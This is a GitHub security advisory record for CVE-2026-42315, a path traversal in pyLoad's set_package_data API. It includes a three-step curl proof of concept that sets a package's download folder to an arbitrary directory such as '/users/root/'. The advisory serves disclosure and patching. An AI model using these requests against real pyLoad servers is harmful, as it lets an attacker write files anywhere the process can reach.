{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/64696149?v=4", "events_url": "https://api.github.com/users/Sab44/events{/privacy}", "followers_url": "https://api.github.com/users/Sab44/followers", "following_url": "https://api.github.com/users/Sab44/following{/other_user}", "gists_url": "https://api.github.com/users/Sab44/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Sab44", "id": 64696149, "login": "Sab44", "node_id": "MDQ6VXNlcjY0Njk2MTQ5", "organizations_url": "https://api.github.com/users/Sab44/orgs", "received_events_url": "https://api.github.com/users/Sab44/received_events", "repos_url": "https://api.github.com/users/Sab44/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Sab44/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Sab44/subscriptions", "type": "User", "url": "https://api.github.com/users/Sab44", "user_view_type": "public"}}], "cve_id": "CVE-2026-42315", "cvss": {"score": 8.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 8.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-22", "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"}, {"cwe_id": "CWE-36", "name": "Absolute Path Traversal"}], "description": "### Summary
No sanitization of package folder name allows writing files anywhere outside the intended download directory.

#### Affected Component
- `src/pyload/core/api/__init__.py`
- Function: `set_package_data()`

### Details
When passing a folder name in the `set_package_data()` API function call inside the data object with key `"_folder"`, there is no sanitization at all, allowing a user with `Perms.MODIFY` to specify arbitrary directories as download locations for a package.

### PoC
1) Create a package, note response package ID e.g. `5`
```
curl -X 'POST' \
  'http://localhost:8000/api/add_package' \
  -H 'accept: application/json' \
  -H 'X-API-Key: <valid api key>' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "set_package_data_exploit_poc",
  "links": [
    "http://example.com/file.txt"
  ],
  "dest": 1
}'
```

2) Call set_package_data for this package ID with an arbitrary directory 
```
curl -X 'POST' \
  'http://localhost:8000/api/set_package_data' \
  -H 'accept: */*' \
  -H 'X-API-Key: <valid api key>' \
  -H 'Content-Type: application/json' \
  -d '{
  "package_id": 5,
  "data": {
    "_folder": "/users/root/"
  }
}'
```

3) New download folder will be set without any checks
```
curl -X 'GET' \
  'http://localhost:8000/api/get_queue' \
  -H 'accept: application/json' \
  -H 'X-API-Key: <valid api key>'
```
Response:
```
[
  {
    "pid": 5,
    "name": "set_package_data_exploit_poc",
    "folder": "/users/root/",
    "site": "",
    "password": "",
    "dest": 1,
    "order": 1,
    "linksdone": 0,
    "sizedone": 0,
    "sizetotal": 0,
    "linkstotal": 1,
    "links": null,
    "fids": null
  }
]
```

### Impact
Allows Absolute Path Traversal to write in an arbitrary directory as long as the pyLoad process has write access.", "epss": {"percentage": 0.00395, "percentile": 0.31508}, "ghsa_id": "GHSA-838g-gr43-qqg9", "github_reviewed_at": "2026-05-05T21:18:19Z", "html_url": "https://github.com/advisories/GHSA-838g-gr43-qqg9", "identifiers": [{"type": "GHSA", "value": "GHSA-838g-gr43-qqg9"}, {"type": "CVE", "value": "CVE-2026-42315"}], "nvd_published_at": "2026-05-11T18:16:35Z", "published_at": "2026-05-05T21:18:19Z", "references": ["https://github.com/pyload/pyload/security/advisories/GHSA-838g-gr43-qqg9", "https://nvd.nist.gov/vuln/detail/CVE-2026-42315", "https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-129.yaml", "https://github.com/advisories/GHSA-838g-gr43-qqg9"], "repository_advisory_url": "https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-838g-gr43-qqg9", "severity": "high", "source_code_location": "https://github.com/pyload/pyload", "summary": "PyLoad vulnerable to Path Traversal via Package Folder Name in set_package_data", "type": "reviewed", "updated_at": "2026-06-08T19:48:43Z", "url": "https://api.github.com/advisories/GHSA-838g-gr43-qqg9", "vulnerabilities": [{"first_patched_version": "0.5.0b3.dev100", "package": {"ecosystem": "pip", "name": "pyload-ng"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 0.5.0b3.dev99"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: PyLoad vulnerable to Path Traversal via Package Folder Name in set_package_data
